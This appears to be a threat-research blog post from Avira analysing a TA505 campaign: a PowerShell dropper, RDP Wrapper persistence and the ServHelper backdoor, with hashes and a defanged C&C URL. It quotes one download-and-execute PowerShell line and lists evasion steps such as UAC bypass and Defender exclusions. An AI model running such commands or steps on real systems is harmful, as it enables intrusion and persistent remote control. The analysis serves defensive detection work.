class="col-md-12 col-xs-12"><p>In late September 2020, researchers at Avira Protection Labs identified a Powershell script originating from the TA505 APT group. This new campaign specifically targets the Americas. In this blog, Anatoly Kazantsev, a specialist threat researcher at Avira Protection Labs, takes a deep dive into the recently found TA505 APT samples and analyzes the infection cycle.</p><p>Over the last few years, TA505 has been identified as the group guilty of spreading malware by carrying out massive malicious spam campaigns. They are the threat actors behind the <a href=https://threatpost.com/law-enforcement-shuts-down-dridex-operation/115036/ target=_blank rel="noopener noreferrer">Dridex</a> banking trojan and <a href=https://cyware.com/news/a-deep-insight-into-the-prolific-ta505-threat-actor-groups-massive-campaigns-53967575>Locky</a>, Philadelphia and GlobeImposter ransomware families.</p><p>Interestingly, TA505 continuously evolve their attacks looking to avoid detection. Slight alterations within their campaigns allows them to observe security vendors&#8217; detection capabilities.</p><p>&nbsp;</p><h2>Script Analysis</h2><p>We start our analysis of TA505&#8217;s new campaign using a sample with the SHA256 hash: <em>54acc99a1c3cd07cc6ece6f86795e5a19194957c11c634a5f0ea1fc52e3d08f3</em></p><p>We observed that the first submission of the script dropper (<em>5e212c0596f2713b44141fa6f3d563cecd5cfdabcdd5b64b3d573b28012b9bed</em>) to VirusTotal was made from Canada.</p><p><img fetchpriority=high decoding=async class="size-full wp-image-2926 aligncenter" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-1.png?x89225 alt width=1078 height=514></p><p>&nbsp;</p><p>In 2019, we saw a similar campaign that was covered by other security companies such as, Positive technologies, Proofpoint, Trendmicro, Blueliv. Since then, the payload versions of the APT group has changed to avoid detection. In August 2020, we observed  cases submitted from Argentina.</p><p>Below are the droppers that we observed in the previous campaign:</p><p><img decoding=async class="size-full wp-image-2929 aligncenter" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-2.png?x89225 alt width=1022 height=242></p><p>At present, droppers are mostly submitted from the United States and Canada. A quick review of the dropper behavior:</p><p><img decoding=async class="size-full wp-image-2932 aligncenter" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-3.png?x89225 alt width=1078 height=594></p><p>The main difference is the Powershell script content that is split up to <em>get-points.ps1</em> and <em>eula_part.*.txt</em>. Earlier, the Powershell script contained all the payload data (we observed “<em>imports.ps1</em>” previously).</p><p><strong>start.vbs</strong> file content:</p><p><img loading=lazy decoding=async class="size-full wp-image-2934 aligncenter" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-4.png?x89225 alt width=716 height=364></p><p><strong>uninst.exe </strong>is renamed <em>wscript.exe</em> with a stripped digital signature – a standard Microsoft Windows utility to deal with Visual Basic scripts:</p><p><img loading=lazy decoding=async class="size-full wp-image-2936 aligncenter" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-5.png?x89225 alt width=696 height=438></p><h3>get-points.ps1 Powershell script</h3><p>The original script is obfuscated and uses TripleDES in CBC mode to decrypt the next Powershell stage:</p><p><img loading=lazy decoding=async class="size-full wp-image-2938 aligncenter" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-6.png?x89225 alt width=852 height=754></p><p>After deobfuscation and decrypting, we can see the most exciting part &#8211; Base64 encoded strings which contain GZipped x64-binary payloads and configuration file:</p><p><img loading=lazy decoding=async class="size-full wp-image-2940 aligncenter" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-7.png?x89225 alt width=892 height=464></p><p>We will not dive deep into the script details in the article. Just describe the main steps that the script does:</p><ul> <li>Drop files on a disk:<ul> <li style="text-align: left;"><em>%SystemRoot%\Branding\mediasrv.png</em></li> <li style="text-align: left;"><em>%SystemRoot%\Branding\mediasvc.png</em></li> <li style="text-align: left;"><em>%SystemRoot%\Branding\wupsvc.jpg</em></li> <li style="text-align: left;"><em>%SystemRoot%\system32\rdpclip.exe</em></li> <li style="text-align: left;"><em>%SystemRoot%\system32\rfxvmt.dll</em></li> <li style="text-align: left;"><em>%Temp%\rpds.reg</em></li></ul> </li> <li>Escalate privileges using the <a href=https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_silentcleanup>SilentCleanup technique</a><img loading=lazy decoding=async class="alignnone size-full wp-image-2942" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-8.png?x89225 alt width=936 height=230></li> <li>Install, setup, and launch a new “TermService” service</li> <li>Add Network Service (S-1-5-20) account to Administrators (S-1-5-32-544) group:<img loading=lazy decoding=async class="alignnone size-full wp-image-2944" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-9.png?x89225 alt width=1036 height=178></li> <li>Set up RDP TCP port from standard 3398 to 7201:<img loading=lazy decoding=async class="alignnone size-full wp-image-2946" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-10.png?x89225 alt width=1042 height=42></li> <li>Add Windows Defender exclusions:<img loading=lazy decoding=async class="alignnone wp-image-2947" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-11.png?x89225 alt width=1078 height=140></li></ul><p>A quick overview of the overall process:</p><p><img loading=lazy decoding=async class="size-full wp-image-2948 aligncenter" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-13.png?x89225 alt width=1078 height=674></p><h3>TermService</h3><p>First, <em>get-points.ps1</em> prepares the Windows registry with rpds.reg:</p><p><img loading=lazy decoding=async class="size-full wp-image-2950 aligncenter" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-14.png?x89225 alt width=808 height=206></p><p>After that, the script sets the <em>ServiceDLL</em> parameter to <em>mediasrv.png</em> full path and launches the TermService and RDP services:</p><p><img loading=lazy decoding=async class="size-full wp-image-2951 aligncenter" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-15.png?x89225 alt width=616 height=186></p><p>It’s a good indicator if some service in your system has a ServiceDLL path tuned to PNG-picture.</p><p>Mediasrv.png is not a picture. It’s an x64 service DLL packed with UPX.</p><p>After exploring the DLL, we realized that this is an open-source RDP Wrapper Library. Its code is available on <a href=https://github.com/stascorp/rdpwrap>GitHub</a></p><p>But there are some interesting changes at ServiceMain function &#8211; executable code which loads another DLL media<strong>svc</strong>.png:</p><p><img loading=lazy decoding=async class="size-full wp-image-2952 aligncenter" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-17.png?x89225 alt width=978 height=642></p><p>Strings were obfuscated with simple XOR operation. Using the IDAPython script, we deobfuscated them and placed them as commentaries in the IDA Pro listing.</p><p>File <em>wupsvc.jpg</em> is just a configuration file for the RDP Wrapper Library:</p><p><img loading=lazy decoding=async class="size-full wp-image-2953 aligncenter" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-18.png?x89225 alt width=1078 height=440></p><p>Thus, using RDP Wrapper Library and TermService allows malware authors to provide persistence and additional RDP features.</p><p><strong>rfxvmt.dll</strong> is a standard Windows “Microsoft RemoteFX VM transport” library and is needed to solve an issue with <a href=https://github.com/stascorp/rdpwrap/issues/194#issuecomment-323564111>Windows 10 Home</a>.</p><p><strong>rdpclip.exe</strong> is also a Microsoft Windows utility (unsigned in this case), allowing users to copy/paste files and data between server and client.</p><h3>mediasvc.png library</h3><p>Now it’s time to focus on the primary payload – a backdoor called ServHelper. Mediasvc.png is an x64 DLL written in Delphi and packed with UPX. DLL strings obfuscated using Vigenère cipher and were easily deobfuscated with IDAPython script:</p><p><img loading=lazy decoding=async class="size-full wp-image-2957 aligncenter" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-19.png?x89225 alt width=898 height=348></p><p>The backdoor has rich functionality, most of which has been described earlier by other security companies. For example, the backdoor allows SSH tunneling using OpenSSH-Win32:</p><p><img loading=lazy decoding=async class="size-full wp-image-2958 aligncenter" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-20.png?x89225 alt width=1040 height=120></p><p><img loading=lazy decoding=async class="size-full wp-image-2959 aligncenter" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-21.png?x89225 alt width=892 height=360></p><p>Command <strong>info</strong> gathers system information, including network connection speed. For this purpose, malware utilizes legitimate Powershell script from GitHub:</p><p><img loading=lazy decoding=async class="size-full wp-image-2961 aligncenter" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-22.png?x89225 alt width=1078 height=230></p><p>The encoded command contains:</p><p><em>IEX (New-Object Net.Webclient).downloadstring(&#8220;https://raw.githubusercontent.com/sqlitey/sqlite/master/speed.ps1&#8221;)</em></p><h2>C&amp;C communication</h2><p>Now, let’s take a look at the malware network communication. The malware uses HTTPS and obfuscates data to send in a POST request:</p><p><img loading=lazy decoding=async class="size-full wp-image-2962 aligncenter" src=https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2020/10/ta505-apt-group-25.png?x89225 alt width=832 height=452></p><p>C&amp;C hxxps://enroter1984.cn/bif/b.php. <strong>sysid</strong> field contains obfuscated campaign date/ID, general system information, username, new RDP-user data, and random ID: <em>sep27;Windows 10 (Version 10.0, Build 18362, 64-bit Edition);x64;ivan.ivanov;nouser;winacc:updwin;op1JUhTe;31337</em></p><p>In the previously publicly described campaigns, malware authors didn’t use obfuscation for these fields. Therefore, we can conclude that the threat actors regularly update their product to evade detections.</p><p>It’s worth noting an exciting part of the <strong>sysid</strong> field in campaign ID (sep27): earlier, we saw samples with aug18, aug5.</p><h2>Conclusion</h2><p>We believe that the TA505 group is experimenting with different techniques and tools in various regions of the world. They are persistent, and in the future, we expect to see new campaigns. It’s quite clear from our analysis that malware authors have started using legitimate tools in their attacks, changing them from time to time. This makes such attacks challenging to handle. Hence, having the highest quality prevention and detection tools are essential to every company involved in cyber-security.</p><p>Avira Protection Labs, actively hunt, gather threat intelligence, and monitor such new APT group campaigns to provide timely detection and protection. Integrating Avira’s <a href=https://oem.avira.com/en/solutions/software-development-kits>anti-malware technologies</a> and <a href=https://oem.avira.com/en/solutions/threat-intelligence>threat
